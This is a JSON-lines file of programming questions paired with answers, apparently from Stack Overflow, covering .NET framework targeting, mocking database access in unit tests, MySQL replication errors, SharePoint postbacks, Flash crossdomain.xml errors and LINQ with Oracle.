{"instruction": "I'm currently using VS2005 Profesional and .NET 2.0, and since our project is rather large (25 projects in the solution), I'd like to try VS 2008, since its theoretically faster with larger projects. \nBefore doing such thing, i'd like to know if what I've read is true: can I use VS2008 in \".net 2.0\" mode? I don't want my customers to install .net 3.0 or .3.5, I just want to install VS2008, open my solution and start working from there. \nIs this possible?\nP.D.: the solution is a c# Window Forms project.", "output": "Yes you can run 2.0 with VS2008.  Be sure to select that when you convert, however.  When converting a project, I mistakenly left in the ASP.NET 3.5 conversion, and then all new files contained references to Linq, so it was a little bit of a pain to switch back to 2.0 when I realized the mistake."}
{"instruction": "I'm currently using VS2005 Profesional and .NET 2.0, and since our project is rather large (25 projects in the solution), I'd like to try VS 2008, since its theoretically faster with larger projects. \nBefore doing such thing, i'd like to know if what I've read is true: can I use VS2008 in \".net 2.0\" mode? I don't want my customers to install .net 3.0 or .3.5, I just want to install VS2008, open my solution and start working from there. \nIs this possible?\nP.D.: the solution is a c# Window Forms project.", "output": "Yes it's possible.  In the project properties you can target different versions of the .Net Framework going back to .NET 2.0.\nUpgrading to VS 2008 will upgrade your Solution file and you won't be able to go back to VS 2005 unless you have backed up your solution"}
{"instruction": "I'm currently using VS2005 Profesional and .NET 2.0, and since our project is rather large (25 projects in the solution), I'd like to try VS 2008, since its theoretically faster with larger projects. \nBefore doing such thing, i'd like to know if what I've read is true: can I use VS2008 in \".net 2.0\" mode? I don't want my customers to install .net 3.0 or .3.5, I just want to install VS2008, open my solution and start working from there. \nIs this possible?\nP.D.: the solution is a c# Window Forms project.", "output": "Yes, the feature that enables this is Visual Studio 2008 is called multi-targeting. See this link for more information. To use it you simply open the Properties for your Project, and select the Target Framework you want from the drop-down list on that page."}
{"instruction": "I'd like to have dashes separate words in my URLs.  So instead of:\n/MyController/MyAction\n\nI'd like:\n/My-Controller/My-Action\n\nIs this possible?", "output": "You could write a custom route that derives from the Route class GetRouteData to strip dashes, but when you call the APIs to generate a URL, you'll have to remember to include the dashes for action name and controller name.\nThat shouldn't be too hard."}
{"instruction": "This error just started popping up all over our site.\nPermission denied to call method to Location.toString\nI'm seeing google posts that suggest that this is related to flash and our crossdomain.xml.  What caused this to occur and how do you fix?", "output": "Are you using javascript to communicate between frames/iframes which point to different domains? This is not permitted by the JS \"same origin/domain\" security policy. Ie, if you have\n<iframe name=\"foo\" src=\"foo.com/script.js\">\n<iframe name=\"bar\" src=\"bar.com/script.js\">\n\nAnd the script on bar.com tries to access window[\"foo\"].Location.toString, you will get this (or similar) exceptions. Please also note that the same origin policy can also kick in if you have content from different subdomains. Here you can find a short and to the point explanation of it with examples."}
{"instruction": "This error just started popping up all over our site.\nPermission denied to call method to Location.toString\nI'm seeing google posts that suggest that this is related to flash and our crossdomain.xml.  What caused this to occur and how do you fix?", "output": "You may have come across this posting, but it appears that a flash security update changed the behaviour of the crossdomain.xml, requiring you to specify a security policy to allow arbitrary headers to be sent from a remote domain. The Adobe knowledge base article (also referenced in the original post) is here."}
{"instruction": "I'm currently using VS2005 Profesional and .NET 2.0, and since our project is rather large (25 projects in the solution), I'd like to try VS 2008, since its theoretically faster with larger projects. \nBefore doing such thing, i'd like to know if what I've read is true: can I use VS2008 in \".net 2.0\" mode? I don't want my customers to install .net 3.0 or .3.5, I just want to install VS2008, open my solution and start working from there. \nIs this possible?\nP.D.: the solution is a c# Window Forms project.", "output": "And bear in mind that all this stuff about the projects being compatible between 2005 and 2008 is NOT true for C/C++ projects."}
{"instruction": "For whatever reason, our company has a coding guideline that states:\nEach class shall have it's own header and implementation file.\nSo if we wrote a class called MyString we would need an associated MyStringh.h and MyString.cxx.\nDoes anyone else do this?  Has anyone seen any compiling performance repercussions as a result?  Does 5000 classes in 10000 files compile just as quickly as 5000 classes in 2500 files?  If not, is the difference noticeable?\n[We code C++ and use GCC 3.4.4 as our everyday compiler]", "output": "The best practice, as others have said, is to place each class in its own translation unit from a code maintenance and understandability perspective. However on large scale systems this is sometimes not advisable - see the section entitled \"Make Those Source Files Bigger\" in this article by Bruce Dawson for a discussion of the tradeoffs."}
{"instruction": "So I'm working on some legacy code that's heavy on the manual database operations. I'm trying to maintain some semblance of quality here, so I'm going TDD as much as possible.\nThe code I'm working on needs to populate, let's say a List<Foo> from a DataReader that returns all the fields required for a functioning Foo. However, if I want to verify that the code in fact returns one list item per one database row, I'm writing test code that looks something like this:\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 1);\n// ....\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 2);\n// ....\nExpect.Call(reader.Read()).Return(false);\n\nWhich is rather tedious and rather easily broken, too. \nHow should I be approaching this issue so that the result won't be a huge mess of brittle tests?\nBtw I'm currently using Rhino.Mocks for this, but I can change it if the result is convincing enough. Just as long as the alternative isn't TypeMock, because their EULA was a bit too scary for my tastes last I checked.\nEdit: I'm also currently limited to C# 2.", "output": "Kokos,\nCouple of things wrong there. First, doing it that way means I have to construct the Foos first, then feed their values to the mock reader which does nothing to reduce the amount of code I'm writing. Second, if the values pass through the reader, the Foos won't be the same Foos (reference equality). They might be equal, but even that's assuming too much of the Foo class that I don't dare touch at this point."}
{"instruction": "This error just started popping up all over our site.\nPermission denied to call method to Location.toString\nI'm seeing google posts that suggest that this is related to flash and our crossdomain.xml.  What caused this to occur and how do you fix?", "output": "This post suggests that there is one line that needs to be added to the crossdomain.xml file.\n<allow-http-request-headers-from domain=\"*\" headers=\"*\"/>"}
{"instruction": "I know I can programatically make the taskbar item for a particular window start flashing when something changes, but is there any way I can stop it from flashing either programatically after a certain period of time or at least is there a keyboard shortcur I can give to my users to somehow stop the flashing?", "output": "I would prefer programmers didn't do this. I find a flashing taskbar to be very disturbing and annoying when I am in the zone doing something else."}
{"instruction": "So I'm working on some legacy code that's heavy on the manual database operations. I'm trying to maintain some semblance of quality here, so I'm going TDD as much as possible.\nThe code I'm working on needs to populate, let's say a List<Foo> from a DataReader that returns all the fields required for a functioning Foo. However, if I want to verify that the code in fact returns one list item per one database row, I'm writing test code that looks something like this:\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 1);\n// ....\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 2);\n// ....\nExpect.Call(reader.Read()).Return(false);\n\nWhich is rather tedious and rather easily broken, too. \nHow should I be approaching this issue so that the result won't be a huge mess of brittle tests?\nBtw I'm currently using Rhino.Mocks for this, but I can change it if the result is convincing enough. Just as long as the alternative isn't TypeMock, because their EULA was a bit too scary for my tastes last I checked.\nEdit: I'm also currently limited to C# 2.", "output": "To make this less tedious, you will need to encapsulate/refactor the mapping between the DataReader and the Object you hold in the list.  There is quite of few steps to encapsulate that logic out.  If that is the road you want to take, I can post code for you.  I am just not sure how practical it would be to post the code here on StackOverflow, but I can give it a shot to keep it concise and to the point.  Otherwise, you are stuck with the tedious task of repeating each expectation on the index accessor for the reader.  The encapsulation process will also get rid of the strings and make those strings more reusable through your tests.\nAlso, I am not sure at this point how much you want to make the existing code more testable.  Since this is legacy code that wasn't built with testing in mind."}
{"instruction": "I'm creating PDFs on-demand with ColdFusion's CFDocument tag, like so:\n<cfdocument format=\"PDF\" filename=\"#attributes.fileName#\" overwrite=\"true\">\n    <cfdocumentitem type=\"footer\">\n        <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">\n            <tr>\n                <td align=\"left\"><font face=\"Tahoma\" color=\"black\"><strong>My Client's Corporation</strong><br/>Street address<br/>City, ST 55555</font></td>\n                <td align=\"right\"><font face=\"Tahoma\" color=\"black\">Phone: 555.555.5555<br/>Fax: 555.555.5555<br/>Email: info@domain.com</font></td>\n            </tr>\n        </table>\n    </cfdocumentitem>\n    <html>\n        <body>\n            <table border=\"0\" cellpadding=\"0\" cellspacing=\"0\" width=\"100%\">\n            <!--- some content here ... --->\n            </table>\n        </body>\n    </html>\n</cfdocument>\n\nThe problem I'm having is that sometimes (actually, most of the time, but not always) some of the footer text is there, but invisible. I can highlight it and copy/paste it into notepad, where I can see it all -- but in the generated PDF only the first line of the left column of the footer is visible, the rest is invisible. Hence why I added the font color of black in the code.\n\nAny ideas on how to correct this?", "output": "A PDF is what I'm after, so I'm not sure how outputting another format would help.\nAs it turns out, the footer space just wasn't enough to fit all of this text; verified by the fact that changing the font size to 4pt would fit it all in without a problem.\nI spent some time attempting to rewrite the footer code using DDX as outlined here and the CFPDF tag to implement it; but even after several hours of hacking away and finally getting a valid DDX as reported by the new isDDX function, the CFPDF tag reported that it was invalid DDX for some reason.\nAt this point I decided I had wasted enough of the client's time/money and just reformatted the footer to be 2 lines of centered text, which was good enough."}
{"instruction": "I have a custom SharePoint application page deployed to the _layouts folder.  It's a custom \"new form\" for a custom content type.  During my interactions with this page, I will need to add an item to my list.  When the page first loads, I can use SPContext.Current.List to see the current list I'm working with.  But after I fill in my form and the form posts back onto itself and IsPostBack is true, then SPContext.Current.List is null so I can't find the list that I need to add my stuff into.\nIs this expected?\nHow should I retain some info about my context list across the postback?  Should I just populate some asp:hidden control with my list's guid and then just pull it back from that on the postback?  That seems safe, I guess.\nFWIW, this is the MOSS 2007 Standard version.", "output": "Generally speaking I try and copy whatever approach the product group has taken when looking to add functionality of my own. In this case they add their own edit/view/add pages via the list definition itself.\nI built a solution that also needed its own custom \"New\" form, not open source unfortunately, though if you are interested you can download it, its called \"Tagged Links\" (Social Bookmarking for SharePoint) and you can find some links on my blog.\nTo give you a few hints and tips, the following should set you off in the right direction:\n\nCreated a new list definition.\nCreated a new Content Type In the content type you can define your own \"FormTemplates\" that references a Rendering Template which determine what gets displayed in the \"Middle\" bit of those forms.\nCopied the standard Rendering Template, but then made the changes to it that I\nneeded.  \nWrapped it all up in a solution, and deployed.\n\nMy Rendering Template actually included an overridden \"Save\" Button where I did a lot of the extra work I needed to do during the save.\nAnyway, it is a little too much work in my opinion but, I think, it most closely matches the standard approach taken by the product developers. Let me know if you need more detail and I will see if I can put together a step-by-step blog post, but hopefully this gets you off on the right direction."}
{"instruction": "I'm running a master-slave MySQL binary log replication system (phew!) that, for some data, is not in sync (meaning, the master holds more data than the slave). But the slave stops very frequently on the slightest MySQL error, can this be disabled? (perhaps a my.cnf setting for the replicating slave ignore-replicating-errors or some of the sort ;) )\nThis is what happens, every now and then, when the slave tries to replicate an item that does not exist, the slave just dies. a quick check at SHOW SLAVE STATUS \\G; gives\n       Slave-IO-Running: Yes\n      Slave-SQL-Running: No\n        Replicate-Do-DB: \n             Last-Errno: 1062\n             Last-Error: Error 'Duplicate entry '15218' for key 1' on query. Default database: 'db'. Query: 'INSERT INTO db.table ( FIELDS ) VALUES ( VALUES )'\n\nwhich I promptly fix (once I realize that the slave has been stopped) by doing the following:\nSTOP SLAVE;\nRESET SLAVE;\nSTART SLAVE;\n\n... lately this has been getting kind of tiresome, and before I spit out some sort of PHP which does this for me, i was wondering if there's some my.cnf entry which will not kill the slave on the first error.\nCheers,\n/mp", "output": "First, do you really want to ignore errors? If you get an error, it is likely that the data is not in sync any more. Perhaps what you want is to drop the slave database and restart the sync process when you get an error.\nSecond, I think the error you are getting is not when you replicate an item that does not exist (what would that mean anyway?) - it looks like you are replicating an item that already exists in the slave database.\nI suspect the problem mainly arises from not starting at a clean data copy. It seems that the master has been copied to the slave; then replication has been turned off (or failed); and then it has started up again, but without giving the slave the chance to catch up with what it missed.\nIf you ever have a time when the master can be closed for write access long enough to clone the database and import it into the slave, this might get the problems to go away."}
{"instruction": "So I'm working on some legacy code that's heavy on the manual database operations. I'm trying to maintain some semblance of quality here, so I'm going TDD as much as possible.\nThe code I'm working on needs to populate, let's say a List<Foo> from a DataReader that returns all the fields required for a functioning Foo. However, if I want to verify that the code in fact returns one list item per one database row, I'm writing test code that looks something like this:\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 1);\n// ....\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 2);\n// ....\nExpect.Call(reader.Read()).Return(false);\n\nWhich is rather tedious and rather easily broken, too. \nHow should I be approaching this issue so that the result won't be a huge mess of brittle tests?\nBtw I'm currently using Rhino.Mocks for this, but I can change it if the result is convincing enough. Just as long as the alternative isn't TypeMock, because their EULA was a bit too scary for my tastes last I checked.\nEdit: I'm also currently limited to C# 2.", "output": "Just to clarify, you want to be able to test your call into SQL Server returned some data, or that if you had some data you could map it back into the model?\nIf you want to test your call into SQL returned some data checkout my answer found here"}
{"instruction": "I know I can programatically make the taskbar item for a particular window start flashing when something changes, but is there any way I can stop it from flashing either programatically after a certain period of time or at least is there a keyboard shortcur I can give to my users to somehow stop the flashing?", "output": "@thomas -- Amazingly Microsoft's own Windows Vista User Experience Guidelines agree with you ...\n\nWhile having a background window flash its taskbar button is better than having it automatically come to the top and steal input focus, flashing taskbar buttons are still very intrusive. It is hard for users to concentrate when a taskbar button is flashing, so you should assume that users will immediately stop what they are doing to make the flashing stop. Consequently, reserve taskbar flashing only for situations where immediate attention is required.\n\nOf course who knows who actually follows those guidelines ... or who even reads them. :)"}
{"instruction": "I'm running a master-slave MySQL binary log replication system (phew!) that, for some data, is not in sync (meaning, the master holds more data than the slave). But the slave stops very frequently on the slightest MySQL error, can this be disabled? (perhaps a my.cnf setting for the replicating slave ignore-replicating-errors or some of the sort ;) )\nThis is what happens, every now and then, when the slave tries to replicate an item that does not exist, the slave just dies. a quick check at SHOW SLAVE STATUS \\G; gives\n       Slave-IO-Running: Yes\n      Slave-SQL-Running: No\n        Replicate-Do-DB: \n             Last-Errno: 1062\n             Last-Error: Error 'Duplicate entry '15218' for key 1' on query. Default database: 'db'. Query: 'INSERT INTO db.table ( FIELDS ) VALUES ( VALUES )'\n\nwhich I promptly fix (once I realize that the slave has been stopped) by doing the following:\nSTOP SLAVE;\nRESET SLAVE;\nSTART SLAVE;\n\n... lately this has been getting kind of tiresome, and before I spit out some sort of PHP which does this for me, i was wondering if there's some my.cnf entry which will not kill the slave on the first error.\nCheers,\n/mp", "output": "Modern mysqldump commands have a couple options to help with setting up consistent replication. Check out --master-data which will put the binary log file and position in the dump and automatically set when loaded into slave. Also --single-transaction will do the dump inside a transaction so that no write lock is needed to do a consistent dump."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "Ideally, your objects should be persistent ignorant. For instance, you should have a \"data access layer\", that you would make requests to, that would return objects. This way, you can leave that part out of your unit tests, or test them in isolation.\nIf your objects are tightly coupled to your data layer, it is difficult to do proper unit testing. the first part of unit test, is \"unit\". All units should be able to be tested in isolation.\nIn my c# projects, I use NHibernate with a completely seperate Data layer. My objects live in the core domain model and are accessed from my application layer. The application layer talks to both the data layer and the domain model layer.\nThe application layer is also sometimes called the \"Business Layer\".\nIf you are using PHP, create a specific set of classes for ONLY data access. Make sure your objects have no idea how they are persisted and wire up the two in your application classes.\nAnother option would be to use mocking/stubs."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "You should mock the database access if you want to unit test your classes. After all, you don't want to test the database in a unit test. That would be an integration test. \nAbstract the calls away and then insert a mock that just returns the expected data. If your classes don't do more than executing queries, it may not even be worth testing them, though..."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "I usually try to break up my tests between testing the objects (and ORM, if any) and testing the db.  I test the object-side of things by mocking the data access calls whereas I test the db side of things by testing the object interactions with the db which is, in my experience, usually fairly limited.\nI used to get frustrated with writing unit tests until I start mocking the data access portion so I didn't have to create a test db or generate test data on the fly.  By mocking the data you can generate it all at run time and be sure that your objects work properly with known inputs."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "You could use mocking frameworks to abstract out the database engine. I don't know if PHP/Python got some but for typed languages (C#, Java etc.) there are plenty of choices\nIt also depends on how you designed those database access code, because some design are easier to unit test than other like the earlier posts have mentioned."}
{"instruction": "I have a custom SharePoint application page deployed to the _layouts folder.  It's a custom \"new form\" for a custom content type.  During my interactions with this page, I will need to add an item to my list.  When the page first loads, I can use SPContext.Current.List to see the current list I'm working with.  But after I fill in my form and the form posts back onto itself and IsPostBack is true, then SPContext.Current.List is null so I can't find the list that I need to add my stuff into.\nIs this expected?\nHow should I retain some info about my context list across the postback?  Should I just populate some asp:hidden control with my list's guid and then just pull it back from that on the postback?  That seems safe, I guess.\nFWIW, this is the MOSS 2007 Standard version.", "output": "I'd like to think my issue is \"special\" here, since I am using a custom form.  I chose to use a custom form rather than a custom FormTemplate simply because I'm doing a lot of stuff that's not very SharePoint list-like (making ajax calls to get info from a third-party app then generating some dynamic form elements based on that ajax result, then subsequent processing of that data on postback).  I thought it'd be a nightmare to try this within the usual custom rendering template mechanism.\nI also don't think I can supply the custom form declarations in the list definition itself, because I have multiple content types associated with this list, and each content type has its own custom form (the other type is thankfully much simpler).\nActually, my simple way of keeping the list guid in my hidden field was a very low impact way to address this specific problem.  My main concern is that I'm not sure why the SPContext just loses all its usefulness when I postback here, which makes me think I'm doing something wrong."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "I've never done this in PHP and I've never used Python, but what you want to do is mock out the calls to the database.  To do that you can implement some IoC whether 3rd party tool or you manage it yourself, then you can implement some mock version of the database caller which is where you will control the outcome of that fake call.\nA simple form of IoC can be performed just by coding to Interfaces. This requires some kind of object orientation going on in your code so it may not apply to what your doing (I say that since all I have to go on is your mention of PHP and Python)\nHope that's helpful, if nothing else you've got some terms to search on now."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "I agree with the first post - database access should be stripped away into a DAO layer that implements an interface.  Then, you can test your logic against a stub implementation of the DAO layer."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "The book xUnit Test Patterns describes some ways to handle unit-testing code that hits a database.  I agree with the other people who are saying that you don't want to do this because it's slow, but you gotta do it sometime, IMO.  Mocking out the db connection to test higher-level stuff is a good idea, but check out this book for suggestions about things you can do to interact with the actual database."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "Unit testing your database access is easy enough if your project has high cohesion and loose coupling throughout.  This way you can test only the things that each particular class does without having to test everything at once.  \nFor example, if you unit test your user interface class the tests you write should only try to verify the logic inside the UI worked as expected, not the business logic or database action behind that function.  \nIf you want to unit test the actual database access you will actually end up with more of an integration test, because you will be dependent on the network stack and your database server, but you can verify that your SQL code does what you asked it to do.\nThe hidden power of unit testing for me personally has been that it forces me to design my applications in a much better way than I might without them.  This is because it really helped me break away from the \"this function should do everything\" mentality.\nSorry I don't have any specific code examples for PHP/Python, but if you want to see a .NET example I have a post that describes a technique I used to do this very same testing."}
{"instruction": "So I'm working on some legacy code that's heavy on the manual database operations. I'm trying to maintain some semblance of quality here, so I'm going TDD as much as possible.\nThe code I'm working on needs to populate, let's say a List<Foo> from a DataReader that returns all the fields required for a functioning Foo. However, if I want to verify that the code in fact returns one list item per one database row, I'm writing test code that looks something like this:\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 1);\n// ....\nExpect.Call(reader.Read()).Return(true);\nExpect.Call(reader[\"foo_id\"]).Return((long) 2);\n// ....\nExpect.Call(reader.Read()).Return(false);\n\nWhich is rather tedious and rather easily broken, too. \nHow should I be approaching this issue so that the result won't be a huge mess of brittle tests?\nBtw I'm currently using Rhino.Mocks for this, but I can change it if the result is convincing enough. Just as long as the alternative isn't TypeMock, because their EULA was a bit too scary for my tastes last I checked.\nEdit: I'm also currently limited to C# 2.", "output": "@Toran: What I'm testing is the programmatic mapping from data returned from the database to quote-unquote domain model. Hence I want to mock out the database connection. For the other kind of test, I'd go for all-out integration testing.\n@Dale: I guess you nailed it pretty well there, and I was afraid that might be the case. If you've got pointers to any articles or suchlike where someone has done the dirty job and decomposed it into more easily digestible steps, I'd appreciate it. Code samples wouldn't hurt either. I do have a clue on how to approach that problem, but before I actually dare do that, I'm going to need to get other things done, and if testing that will require tedious mocking, then that's what I'll do."}
{"instruction": "I've done this before in C++ by including sqlite.h but is there a similarly easy way in C#?", "output": "I've used this with great success:\nhttp://system.data.sqlite.org/\nFree with no restrictions.\n(Note from review: Original site no longer exists.  The above link has a link pointing the the 404 site and has all the info of the original)\n--Bruce"}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "Options you have:\n\nWrite a script that will wipe out database before you start unit tests, then populate db with predefined set of data and run the tests. You can also do that before every test \u2013 it'll be slow, but less error prone.\nInject the database. (Example in pseudo-Java, but applies to all OO-languages) \nclass Database {\n public Result query(String query) {... real db here ...}\n}\nclass MockDatabase extends Database {\n  public Result query(String query) { \n    return \"mock result\"; \n  }\n}\nclass ObjectThatUsesDB {\n public ObjectThatUsesDB(Database db) { \n   this.database = db; \n }\n}\n\nnow in production you use normal database and for all tests you just inject the mock database that you can create ad hoc.\nDo not use DB at all throughout most of code (that's a bad practice anyway). Create a \"database\" object that instead of returning  with results will return normal objects (i.e. will return User instead of a tuple {name: \"marcin\", password: \"blah\"}) write all your tests with ad hoc constructed real objects and write one big test that depends on a database that makes sure this conversion works OK.\n\nOf course these approaches are not mutually exclusive and you can mix and match them as you need."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "The easiest way to unit test an object with database access is using transaction scopes. \nFor example:\n    [Test]\n\t[ExpectedException(typeof(NotFoundException))]\n\tpublic void DeleteAttendee() {\n\n\t\tusing(TransactionScope scope = new TransactionScope()) {\n\t\t\tAttendee anAttendee = Attendee.Get(3);\n\t\t\tanAttendee.Delete();\n\t\t\tanAttendee.Save();\n\n\t\t\t//Try reloading. Instance should have been deleted.\n\t\t\tAttendee deletedAttendee = Attendee.Get(3);\n\t\t}\n\t}\n\nThis will revert back the state of the database, basically like a transaction rollback so you can run the test as many times as you want without any sideeffects. We've used this approach successfully in large projects. Our build does take a little long to run (15 minutes), but it is not horrible for having 1800 unit tests. Also, if build time is a concern, you can change the build process to have multiple builds, one for building src, another that fires up afterwards that handles unit tests, code analysis, packaging, etc..."}
{"instruction": "I'm having trouble figuring out how to get the testing framework set up and usable in Visual Studio 2008 for C++ presumably with the built-in unit testing suite.\nAny links or tutorials would be appreciated.", "output": "I like the CxxTest as well for the same reasons. It's a header file only so no linking required. You aren't stuck with Perl as there is a Python runner as well. I will be reviewing the google library soon. The Boost stuff pulls in too much other baggage."}
{"instruction": "I can connect with the DataContext to the Oracle database however I get errors in running the query against the oracle database.  I looked at the SQL generated and it is for MSSQL and not Oracle PSQL.  \nDoes anybody know of a decent easy to use wrapper to use LINQ against an Oracle Database?", "output": "Not an easy way, at least until a good provider is produced.\nReally MS should provide at least an OLEDB Linq provider.  After all, Linq to Sql is basically an implementation of IQueryable with designer support."}
{"instruction": "I can connect with the DataContext to the Oracle database however I get errors in running the query against the oracle database.  I looked at the SQL generated and it is for MSSQL and not Oracle PSQL.  \nDoes anybody know of a decent easy to use wrapper to use LINQ against an Oracle Database?", "output": "No, LINQ to SQL is very much MS SQL only - think of it as a client driver.\nMicrosoft is/was helping Oracle and DataDirect develop providers for Oracle and other non-MS database servers."}
{"instruction": "I've heard that unit testing is \"totally awesome\", \"really cool\" and \"all manner of good things\" but 70% or more of my files involve database access (some read and some write) and I'm not sure how to write a unit test for these files.\nI'm using PHP and Python but I think it's a question that applies to most/all languages that use database access.", "output": "I would suggest mocking out your calls to the database.  Mocks are basically objects that look like the object you are trying to call a method on, in the sense that they have the same properties, methods, etc. available to caller.  But instead of performing whatever action they are programmed to do when a particular method is called, it skips that altogether, and just returns a result. That result is typically defined by you ahead of time.  \nIn order to set up your objects for mocking, you probably need to use some sort of inversion of control/ dependency injection pattern, as in the following pseudo-code:\nclass Bar\n{\n    private FooDataProvider _dataProvider;\n\n    public instantiate(FooDataProvider dataProvider) {\n        _dataProvider = dataProvider;\n    }\n\n    public getAllFoos() {\n        // instead of calling Foo.GetAll() here, we are introducing an extra layer of abstraction\n        return _dataProvider.GetAllFoos();\n    }\n}\n\nclass FooDataProvider\n{\n    public Foo[] GetAllFoos() {\n        return Foo.GetAll();\n    }\n}\n\nNow in your unit test, you create a mock of FooDataProvider, which allows you to call the method GetAllFoos without having to actually hit the database.\nclass BarTests\n{\n    public TestGetAllFoos() {\n        // here we set up our mock FooDataProvider\n        mockRepository = MockingFramework.new()\n        mockFooDataProvider = mockRepository.CreateMockOfType(FooDataProvider);\n\n        // create a new array of Foo objects\n        testFooArray = new Foo[] {Foo.new(), Foo.new(), Foo.new()}\n\n        // the next statement will cause testFooArray to be returned every time we call FooDAtaProvider.GetAllFoos,\n        // instead of calling to the database and returning whatever is in there\n        // ExpectCallTo and Returns are methods provided by our imaginary mocking framework\n        ExpectCallTo(mockFooDataProvider.GetAllFoos).Returns(testFooArray)\n\n        // now begins our actual unit test\n        testBar = new Bar(mockFooDataProvider)\n        baz = testBar.GetAllFoos()\n\n        // baz should now equal the testFooArray object we created earlier\n        Assert.AreEqual(3, baz.length)\n    }\n}\n\nA common mocking scenario, in a nutshell.  Of course you will still probably want to unit test your actual database calls too, for which you will need to hit the database."}
{"instruction": "I can connect with the DataContext to the Oracle database however I get errors in running the query against the oracle database.  I looked at the SQL generated and it is for MSSQL and not Oracle PSQL.  \nDoes anybody know of a decent easy to use wrapper to use LINQ against an Oracle Database?", "output": "One thing you might look into is that there is now LINQ to Entities, which leverages the MS Entity Framework, which I believe is DB agnostic. I'm still looking into how it works myself, but if you could create an ADO.NET Data Entity that interfaces with Oracle, you could then use LINQ against that Entity."}
{"instruction": "I have some C# / asp.net code I inherited which has a textbox which I want to make multiline. I did so by adding textmode=\"multiline\" but when I try to insert a newline, the enter key instead submits the form :P\nI googled around and it seems like the default behavior should be for enter (or control-enter) to insert a newline. Like I said I inherited the code so I'm not sure if there's javascript monkeying around or if there's just a simple asp.net thing I have to do.", "output": "@dave-ward, I just dug through mounds of javascript. most was ASP.NET generated stuff for validation and AJAX, there's a bunch starting with \"WebForm_\" that I guess is standard stuff to do the defaultbutton, etc. the only javascript we put on the page is for toggling visibility and doing some custom validation...\nedit: I did find the below. I don't understand it though :P the beginning of the form the textarea is in, and a script found later: (note, something on stackoverflow is messing with the underscores)\n<form name=\"Form1\" method=\"post\" action=\"default.aspx\" onsubmit=\"javascript:return WebForm_OnSubmit();\" id=\"Form1\">\n\n<script type=\"text/javascript\">\n//<![CDATA[\nvar theForm = document.forms['Form1'];\nif (!theForm) {\n    theForm = document.Form1;\n}\nfunction __doPostBack(eventTarget, eventArgument) {\n    if (!theForm.onsubmit || (theForm.onsubmit() != false)) {\n        theForm.__EVENTTARGET.value = eventTarget;\n        theForm.__EVENTARGUMENT.value = eventArgument;\n        theForm.submit();\n    }\n}\n//]]>\n</script>"}
{"instruction": "I have a custom SharePoint application page deployed to the _layouts folder.  It's a custom \"new form\" for a custom content type.  During my interactions with this page, I will need to add an item to my list.  When the page first loads, I can use SPContext.Current.List to see the current list I'm working with.  But after I fill in my form and the form posts back onto itself and IsPostBack is true, then SPContext.Current.List is null so I can't find the list that I need to add my stuff into.\nIs this expected?\nHow should I retain some info about my context list across the postback?  Should I just populate some asp:hidden control with my list's guid and then just pull it back from that on the postback?  That seems safe, I guess.\nFWIW, this is the MOSS 2007 Standard version.", "output": "I would be surprised if you could do something in a _Layouts file that you can't do in a forms template. You have pretty much the same technologies at your disposal. \nLooking at the way SharePoint works with ListItems and Layouts pages (for example \"Manage Permissions\" on a list item), I can see that they pass some variables in via querystrings:\n?obj={76113B3A-FABA-4389-BC85-4BB2CC5AB423},6,LISTITEM&List={76113B3A-FABA-4389-BC85-4BB2CC5AB423}\nPerhaps they grab the context back each time programmatically using these values."}
